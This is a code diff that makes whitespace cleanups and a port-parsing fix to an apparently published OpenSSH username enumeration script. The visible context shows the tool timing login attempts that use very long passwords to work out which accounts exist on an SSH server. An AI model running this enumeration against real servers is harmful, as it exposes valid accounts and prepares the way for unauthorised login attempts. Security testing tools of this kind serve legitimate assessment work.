@@ -2,7 +2,7 @@
 
 #Released as open source by NCC Group Plc - http://www.nccgroup.com/
 
-#OpenSSH Username enumeration 
+#OpenSSH Username enumeration
 #Developed by David Cash <David.Cash@nccgroup.com>
 #https://github.com/nccgroup/ssh_user_enum
 
@@ -48,7 +48,7 @@ def enumattempt(user,host, port,threshold):
 			print 'User ' + username + ' exists'
 			return username
 		else:
-			return			
+			return
 
 
 def autotune(host, port, username):
@@ -61,7 +61,7 @@ def autotune(host, port, username):
 	while (multiplier < 500000):
 		autotunetime = []
 		password = "A"*multiplier
-		print "Trying multiplier of: " + str(multiplier) 
+		print "Trying multiplier of: " + str(multiplier)
 		for username in autotuneusers:
 			#Start time
 				starttime = time.mktime(time.gmtime())
@@ -88,7 +88,7 @@ def autotune(host, port, username):
 						multiplier = multiplier + 1000
 					else:
 						return multiplier, validlength
-							
+
 
 
 
@@ -119,7 +119,7 @@ else:
 	multiplier = 20000
 
 if options.port:
-	port = int(port)
+	port = int(options.port)
 else:
 	port = 22
 
@@ -153,7 +153,3 @@ for user in usernames:
 validnames = [i for i in validnames if i is not None]
 print "\n\nThe following users were valid (settings were - multiplier of " + str(multiplier) + " and a threshold of " + str(threshold) + ":\n==========================="
 print "\n".join(validnames)
-
-
-
-
